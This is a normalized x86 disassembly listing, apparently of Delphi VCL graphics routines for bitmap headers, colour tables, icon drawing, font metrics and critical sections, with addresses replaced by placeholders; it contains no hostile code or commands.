sub ecx 0xe
mov edx edi
mov eax ebx
call sub_423a84
call sub_41f06c
add esp 0x64
pop edi
pop esi
pop ebx
retn
sub_42405c
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x8 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
call sub_42368c
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402b40
test edi edi
je r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
lea eax [ ebp - 0x58 ]
push eax
push 0x54
push edi
call GetObjectA
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ esi + 0x10 ]
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
call sub_422ca4
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_4240f7
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_42395c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_424120
push ebx
push esi
push edi
push ebp
add esp 0xffffffac
mov ebx edx
mov esi eax
mov eax esi
call sub_423548
cmp bl al
je r-xdata
add esp 0x54
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x28 ]
cmp [ edi + 0x8 ] 0x0
jne r-xdata
test bl bl
jne r-xdata
cmp [ edi + 0x14 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
mov eax [ edi + 0x14 ]
test eax eax
je r-xdata
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_42368c
mov eax esi
call sub_42379c
push esi
push edi
lea esi [ edi + 0x18 ]
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
cmp [ edi + 0x4 ] 0x1
sete bl
test bl bl
je r-xdata
cmp eax [ edi + 0x14 ]
jne r-xdata
mov eax esi
call sub_42368c
mov eax esi
call sub_42379c
mov eax esi
call sub_423618
cmp [ edi + 0x4 ] 0x1
jne r-xdata
cmp eax [ edi + 0x8 ]
je r-xdata
mov [ edi + 0x30 ] 0x28
jmp r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
jmp r-xdata
mov eax [ edi + 0x10 ]
call sub_422ca4
mov ebp eax
mov ebp [ edi + 0x10 ]
jmp r-xdata
lea eax [ edi + 0x18 ]
push eax
mov ecx [ edi + 0x10 ]
mov edx [ edi + 0x14 ]
mov eax esi
call sub_4230a8
jmp r-xdata
mov eax [ edi + 0x14 ]
xor edx edx
mov [ edi + 0x14 ] edx
mov ebp [ edi + 0x10 ]
xor edx edx
mov [ edi + 0x10 ] edx
lea edx [ edi + 0x18 ]
push edx
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_42395c
jmp r-xdata
push esp
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_42395c
mov [ edi + 0x8 ] eax
jmp r-xdata
push esp
push 0x0
mov ecx ebp
mov edx [ edi + 0x10 ]
mov eax [ edi + 0x14 ]
call sub_422640
test bl bl
je r-xdata
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_424258
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x20 ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_42369c
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x8 ] edi
mov [ esp + 0x20 ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_4230a8
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_4242ac
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx edx
mov edi eax
mov esi [ edi + 0x28 ]
lea eax [ esi + 0x30 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0xe ] 0x1
je r-xdata
cmp bl al
je r-xdata
mov al 0x1
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_42369c
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
xor eax eax
mov al bl
mov [ esp + 0x24 ] ax
mov [ esp + 0x26 ] ax
mov [ esp + 0x10 ] ax
mov [ esp + 0x12 ] ax
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax edi
call sub_4230a8
mov edx edi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_42432c
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
cmp edi [ eax + 0x10 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_42368c
mov eax ebx
call sub_42369c
push esi
push edi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
lea eax [ ebp - 0x58 ]
push eax
push 0x0
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
mov ecx edi
call sub_422640
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4243c3
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
mov al [ esi + 0x70 ]
push eax
push 0x0
mov ecx edi
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_42395c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_422538
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax [ esi + 0x10 ]
call sub_41d0f0
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
sub_4243c8
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
call sub_4038d8
call sub_40392c
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_422538
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_424400
push ebx
push esi
mov esi eax
cmp edx [ esi + 0x34 ]
je r-xdata
pop esi
pop ebx
retn
cmp edx 0x20000000
jne r-xdata
mov [ esi + 0x38 ] 0x1
mov [ esi + 0x38 ] 0x0
jmp r-xdata
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax esi
call sub_42369c
lea eax [ ebx + 0x18 ]
push eax
mov ecx [ ebx + 0x10 ]
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_4230a8
mov [ esi + 0x34 ] edx
mov eax [ esi + 0x28 ]
cmp [ eax + 0x4 ] 0x1
jle r-xdata
sub_424450
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x1c ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_42369c
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x4 ] edi
mov [ esp + 0x1c ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_4230a8
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_4244ac
push ebx
push esi
push edi
push ebp
add esp 0xfffffbd4
mov ebx ecx
mov edi edx
mov esi eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402b40
mov [ esp + 0x10 ] 0x4d42
mov eax [ esi + 0x28 ]
mov ebp [ eax + 0x6c ]
test ebp ebp
je r-xdata
mov eax esi
call sub_423618
mov ebp [ esi + 0x28 ]
xor eax eax
mov [ esp ] eax
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax ebp
mov edx [ eax ]
call [ edx ]
mov [ esp ] eax
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx [ ebp + 0x50 ]
push edx
lea ecx [ esp + 0x4 ]
lea edx [ esp + 0xc ]
call sub_41ffd0
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ esi + 0x28 ]
mov ebx [ eax + 0x6c ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
jmp r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_4168c4
cmp [ esp ] 0x0
je r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_4168c4
mov eax [ esp + 0x8 ]
add eax 0xe
add [ esp ] eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402b40
mov [ esp + 0x10 ] 0x4d42
mov eax esi
call sub_4234dc
mov dl [ r-xdata ]
call sub_41ee68
mov eax [ ebp + 0x14 ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
call sub_41f18c
mov [ esp + 0xc ] eax
lea eax [ esp + 0x2a ]
push eax
push 0x100
push 0x0
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call GetDIBColorTable
mov [ esp + 0x4 ] eax
mov eax [ esp + 0xc ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp + 0x50 ]
test eax eax
jbe r-xdata
mov [ esp + 0x8 ] 0xc
mov ax [ ebp + 0x3e ]
cmp ax 0x8
ja r-xdata
add esp 0x42c
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebp + 0x18 ]
call sub_4225f4
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x70 ] 0x0
jne r-xdata
cmp eax [ esp + 0x4 ]
jae r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
lea eax [ eax + eax * 2 ]
add [ esp + 0x8 ] eax
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ ebp + 0x50 ]
test eax eax
je r-xdata
mov eax [ esp ]
mov [ esp + 0x12 ] eax
mov eax [ esp + 0x8 ]
add eax 0xe
mov [ esp + 0x1a ] eax
cmp [ esp + 0x4 ] 0x0
jne r-xdata
mov [ esp + 0x4 ] eax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_4168c4
lea edx [ ebp + 0x30 ]
mov ecx 0x28
mov eax edi
call sub_4168c4
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
lea eax [ ebp + 0x30 ]
mov [ esp + 0x1e ] 0xc
mov dx [ eax + 0x4 ]
mov [ esp + 0x22 ] dx
mov dx [ eax + 0x8 ]
mov [ esp + 0x24 ] dx
mov [ esp + 0x26 ] 0x1
mov ax [ eax + 0xe ]
mov [ esp + 0x28 ] ax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_4168c4
lea edx [ esp + 0x1e ]
mov ecx 0xc
mov eax edi
call sub_4168c4
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ ebp + 0x50 ] eax
cmp eax [ esp + 0x4 ]
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp + 0x70 ]
xor ecx ecx
mov cl [ eax + rw-data ]
imul ecx [ esp + 0x4 ]
lea edx [ esp + 0x2a ]
mov eax edi
call sub_4168c4
mov edx [ ebp + 0x2c ]
mov ecx [ ebp + 0x44 ]
mov eax edi
call sub_4168c4
test [ ebp + 0x40 ] 0x3
je r-xdata
lea edx [ esp + 0x4 ]
lea eax [ esp + 0x2a ]
call sub_41f5fc
cmp [ ebp + 0x70 ] 0x0
je r-xdata
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
lea edx [ ebp + 0x58 ]
mov ecx 0xc
mov eax edi
call sub_4168c4
lea edx [ esp + 0x2a ]
mov ecx 0xff
mov eax [ ebp + 0x10 ]
call sub_41f920
mov [ esp + 0x4 ] eax
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
mov eax [ esp + 0x4 ]
shl eax 0x2
add [ esp ] eax
add [ esp + 0x8 ] eax
sub_42476c
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx eax
mov [ edx ] 0x2
mov eax ebx
call sub_42369c
mov esi [ ebx + 0x28 ]
push esi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x58 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov edi [ esi + 0x10 ]
mov ecx edi
mov edx edi
mov eax [ esi + 0x8 ]
call sub_422640
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
xor eax eax
push ebp
push sub_4247e6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
call sub_422ca4
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42480c
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_403124
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403114
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_424854
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_42030c
mov [ edi + 0x21 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_42246c
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_4248a8
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_422470
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4146f0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_4248d8
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
xor ecx ecx
xor edx edx
mov eax esi
call sub_424bb0
mov edi ebx
mov eax [ edi + 0x28 ]
call sub_42246c
mov eax [ esi + 0x28 ]
call sub_422470
mov eax [ edi + 0x28 ]
mov [ esi + 0x28 ] eax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_41471c
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
sub_424938
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax esi
call sub_41ee68
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_424990
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ esi + 0x4 ]
push eax
call DrawIconEx
pop edi
pop esi
pop ebx
retn
sub_4249cc
push ebx
push esi
add esp 0xfffffff4
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x0
call sub_416680
mov edx esp
mov ecx 0x6
mov eax [ ebx + 0xc ]
call sub_41688c
mov ax [ esp + 0x2 ]
sub ax 0x1
jb r-xdata
mov eax [ rw-data ]
mov [ esp + 0x8 ] eax
jmp r-xdata
je r-xdata
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
push 0x6
lea eax [ esi + 0x2c ]
push eax
lea eax [ ebx + 0x10 ]
push eax
movzx ecx [ esp + 0x10 ]
lea edx [ esp + 0x14 ]
mov eax [ ebx + 0xc ]
call sub_41fbcc
jmp r-xdata
jmp r-xdata
call sub_41f078
sub_424a44
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_424ad1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_424990
cmp eax [ rw-data ]
jne r-xdata
call sub_41f078
mov eax esi
call sub_424990
mov edx eax
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_420110
lea eax [ ebp - 0xa ]
xor ecx ecx
mov edx 0x6
call sub_402b40
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_4168c4
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_424af8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_424b86
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx ]
push eax
mov eax esi
call sub_416660
pop edx
sub edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax esi
call sub_41688c
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_41688c
mov ax [ ebp - 0x8 ]
sub ax 0x2
jb r-xdata
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_424bb0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_41f078
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_424b8b
mov eax [ ebp - 0x4 ]
call sub_403124
call sub_4038d8
call sub_40392c
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_424bb0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_424bf0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] esi
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_42246c
mov eax [ ebx + 0x28 ]
call sub_422470
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x28 ] eax
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_424c70
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_424a44
mov eax [ ebx + 0x28 ]
mov ebx [ eax + 0xc ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax esi
call sub_4168c4
pop esi
pop ebx
retn
sub_424cc0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_424d01
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call sub_420d88
mov ecx esi
mov edx ebx
call sub_420a28
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424d08
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
sub_424d10
push ebx
push 0x0
call GetDC
mov ebx eax
push 0x5a
push ebx
call GetDeviceCaps
mov [ rw-data ] eax
push ebx
push 0x0
call ReleaseDC
mov eax rw-data
mov edx 0xf
call sub_41f6cc
mov [ rw-data ] eax
pop ebx
retn
sub_424d48
push ebx
push esi
add esp 0xffffffc8
mov bl 0x1
push 0x0
call GetDC
mov esi eax
test esi esi
je r-xdata
mov eax ebx
add esp 0x38
pop esi
pop ebx
retn
mov eax [ rw-data ]
push eax
push esi
call SelectObject
test eax eax
je r-xdata
push esi
push 0x0
call ReleaseDC
push esp
push esi
call GetTextMetricsA
test eax eax
je r-xdata
mov bl [ esp + 0x34 ]
sub_424d8c
push ebx
push esi
push edi
push 0x48
mov eax [ rw-data ]
push eax
push 0x8
call MulDiv
neg eax
mov [ rw-data ] eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_424d48
mov ebx eax
mov eax ebx
sub al 0x80
jne r-xdata
mov esi r-xdata
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x48
mov eax [ rw-data ]
push eax
push 0x9
call MulDiv
neg eax
mov [ rw-data ] eax
mov [ rw-data ] bl
sub_424e58
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax esi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_424e90
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
mov eax esi
call sub_425088
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_424ed4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_424ebc
xor eax eax
push ebp
push sub_424f75
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424f7c
mov eax [ ebp - 0x4 ]
call sub_424ec8
retn
mov eax 0x10
call sub_4026e4
mov [ ebp - 0x8 ] eax
mov edi [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ edi ] eax
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_424f88
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] esi
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp esi [ eax + 0xc ]
jne r-xdata
sub_424f88
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov dl 0x1
mov eax [ r-xdata ]
call sub_422f14
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_425067
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x8 ]
call sub_4234dc
mov edi eax
mov eax [ edi + 0x14 ]
xor edx edx
call sub_41e768
mov eax [ edi + 0x14 ]
mov edx ebx
call sub_41e64c
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_412cd4
lea edx [ ebp - 0x18 ]
mov eax edi
call sub_41e9f0
xor esi esi
mov edx ebx
and edx 0x80000001
jns r-xdata
dec eax
or eax 0xfffffffe
inc eax
cmp eax edx
jne r-xdata
dec edx
or edx 0xfffffffe
inc edx
inc ebx
cmp ebx 0x9
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx esi
mov edx ebx
mov eax edi
call sub_41ed4c
mov eax esi
and eax 0x80000001
jns r-xdata
inc esi
cmp esi 0x9
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x8 ]
call sub_423198
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_425088
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_424ebc
xor eax eax
push ebp
push sub_4250d3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4250da
mov eax [ ebp - 0x4 ]
call sub_424ec8
retn
mov esp ebp
pop ebp
retn
sub_4250da
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_402704
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
call sub_403124
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_424ebc
xor eax eax
push ebp
push sub_4250d3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4250da
mov eax [ ebp - 0x4 ]
call sub_424ec8
retn
mov esp ebp
pop ebp
retn
sub_425100
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_41d9c0
push eax
mov eax ebx
call sub_41d9c0
mov edx eax
mov eax [ rw-data ]
pop ecx
call sub_424ed4
mov eax [ eax + 0x4 ]
pop esi
pop ebx
retn
sub_425138
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_425201
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425208
retn
mov eax [ rw-data ]
call sub_403124
mov eax [ rw-data ]
call sub_403124
mov eax [ rw-data ]
call sub_403124
call sub_422150
mov eax [ rw-data ]
call sub_403124
mov eax [ rw-data ]
call sub_403124
mov eax [ rw-data ]
call sub_403124
mov eax [ rw-data ]
call sub_403124
mov eax [ rw-data ]
call sub_403124
mov eax [ rw-data ]
push eax
call DeleteObject
push rw-data
call DeleteCriticalSection
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_404980
mov eax rw-data
mov ecx 0x34
mov edx [ r-xdata ]
call sub_404980
sub_42520c
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_424d10
push rw-data
call InitializeCriticalSection
push rw-data
call InitializeCriticalSection
push 0x7
call GetStockObject
